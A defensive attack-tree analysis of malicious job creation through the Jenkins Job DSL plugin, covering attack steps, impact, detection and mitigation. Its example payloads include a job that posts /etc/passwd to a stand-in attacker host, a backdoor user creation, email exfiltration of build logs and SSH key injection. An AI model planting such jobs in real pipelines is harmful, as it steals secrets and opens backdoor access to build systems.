### 4. Deep Analysis of Attack Tree Path: Create New Malicious Jobs

**Attack Tree Path:** Create New Malicious Jobs [HIGH-RISK PATH]

**Description:** Attackers with permissions to create new jobs can define jobs specifically designed for malicious purposes. These jobs could contain backdoors, data exfiltration mechanisms, or be used to launch further attacks.

**Detailed Breakdown:**

* **Attack Vector:** Leveraging the Jenkins Job DSL plugin's functionality to programmatically define and create new jobs.
* **Prerequisites:**
    * **Compromised Credentials or Insider Threat:** The attacker must possess valid Jenkins credentials with the necessary permissions to create new jobs. This could be due to compromised accounts, weak passwords, or a malicious insider.
    * **Access to Jenkins Interface:** The attacker needs access to the Jenkins web interface or API to interact with the Job DSL plugin.
* **Attack Steps:**
    1. **Authentication and Authorization:** The attacker authenticates to Jenkins using their compromised or legitimate credentials.
    2. **Access Job DSL Interface:** The attacker navigates to the Job DSL seed job configuration or uses the Job DSL API endpoint.
    3. **Craft Malicious Job Definition:** The attacker writes a Job DSL script that defines a new job with malicious intent. This script could include:
        * **Execution of Arbitrary Code:** Using shell commands or Groovy scripts within the job definition to execute malicious code on the Jenkins master or agent nodes.
        * **Data Exfiltration:**  Defining steps to collect sensitive data from the Jenkins environment, build artifacts, or connected systems and transmit it to an external location.
        * **Backdoor Installation:** Creating persistent mechanisms for remote access, such as adding new users, modifying SSH configurations, or deploying web shells.
        * **Resource Consumption:** Defining jobs that consume excessive resources (CPU, memory, disk space) to cause denial-of-service.
        * **Privilege Escalation:** Attempting to leverage Jenkins' permissions to access or modify resources beyond the intended scope.
        * **Launching Further Attacks:** Using the compromised Jenkins environment as a staging ground to attack other systems within the network.
    4. **Execute Job DSL Script:** The attacker triggers the Job DSL seed job or sends the malicious DSL script to the API, causing Jenkins to create the new malicious job.
    5. **Trigger Malicious Job:** The attacker triggers the newly created malicious job, either manually or by configuring it to run on a schedule or in response to specific events.

**Potential Malicious Payloads (Examples):**

* **Shell Script Execution:**
    ```groovy
    job('malicious-job') {
        steps {
            shell('curl -X POST -d "stolen_data=$(cat /etc/passwd)" http://attacker.com/receive_data')
        }
    }
    ```
* **Groovy Script Execution:**
    ```groovy
    job('malicious-job') {
        steps {
            groovy {
                command '''
                    def proc = "useradd -m -p 'password' attacker".execute()
                    proc.waitFor()
                '''
            }
        }
    }
    ```
* **Data Exfiltration via Email:**
    ```groovy
    job('malicious-job') {
        steps {
            mail {
                to 'attacker@example.com'
                subject 'Jenkins Data'
                body "Build log: ${BUILD_LOG_EXCERPT}"
            }
        }
    }
    ```
* **Backdoor via SSH Key Injection:**
    ```groovy
    job('malicious-job') {
        steps {
            shell('echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys')
        }
    }
    ```

**Impact Analysis:**

* **Confidentiality:** Exposure of sensitive data stored within Jenkins, build artifacts, or accessible systems. This could include source code, credentials, API keys, and other proprietary information.
* **Integrity:** Modification of Jenkins configurations, build processes, or deployed applications. This could lead to the introduction of backdoors, malware, or unintended functionality.
* **Availability:** Denial of service due to resource exhaustion or disruption of critical build and deployment pipelines.
* **Reputation Damage:**  Compromise of the Jenkins instance can severely damage the organization's reputation and trust with customers.
* **Supply Chain Attacks:**  Malicious jobs could potentially inject vulnerabilities or backdoors into the software being built and deployed, leading to supply chain attacks.

**Detection Strategies:**

* **Regular Security Audits:** Reviewing user permissions and access controls to ensure the principle of least privilege is enforced.
* **Code Review of Job DSL Scripts:** Implementing a process for reviewing Job DSL scripts before they are executed, similar to code reviews for application code.
* **Monitoring Job Creation Activity:**  Logging and monitoring the creation of new jobs and changes to existing job configurations.
* **Anomaly Detection:**  Identifying unusual patterns in job execution, resource consumption, or network traffic originating from Jenkins.
* **Static Analysis of Job DSL Scripts:** Using tools to analyze Job DSL scripts for potentially malicious patterns or insecure configurations.
* **Regular Security Scanning:** Scanning the Jenkins master and agent nodes for vulnerabilities and malware.

**Mitigation Strategies:**

* **Principle of Least Privilege:**  Granting only the necessary permissions to users for creating and managing jobs. Avoid granting administrative privileges unnecessarily.
* **Role-Based Access Control (RBAC):** Implementing a robust RBAC system to manage user permissions effectively.
* **Input Validation and Sanitization:**  While Job DSL is code, consider mechanisms to validate or sanitize inputs if user-provided data is incorporated into DSL scripts.
* **Secure Configuration of Jenkins:** Following security best practices for configuring Jenkins, including enabling security features, using HTTPS, and regularly updating the platform and plugins.
* **Sandboxing or Containerization:**  Running build agents in isolated environments (e.g., containers) to limit the impact of malicious code execution.
* **Regular Backups and Disaster Recovery:**  Maintaining regular backups of the Jenkins configuration and data to facilitate recovery in case of compromise.
* **Security Awareness Training:** Educating users about the risks associated with creating and executing untrusted code within Jenkins.
* **Consider Alternative Job Configuration Methods:** If the full power of Job DSL is not required, explore alternative, more restrictive methods for job configuration.
* **Implement Approval Workflows:** For sensitive job creation or modification actions, implement approval workflows requiring review by authorized personnel.

**Conclusion:**

The "Create New Malicious Jobs" attack path represents a significant security risk in environments utilizing the Jenkins Job DSL plugin. Attackers with sufficient permissions can leverage the plugin's flexibility to introduce malicious code and compromise the Jenkins environment and potentially downstream systems. Implementing robust access controls, code review processes, monitoring mechanisms, and adhering to security best practices are crucial for mitigating this risk. The development team should prioritize implementing the recommended mitigation strategies to ensure the security and integrity of the application and its build pipeline.
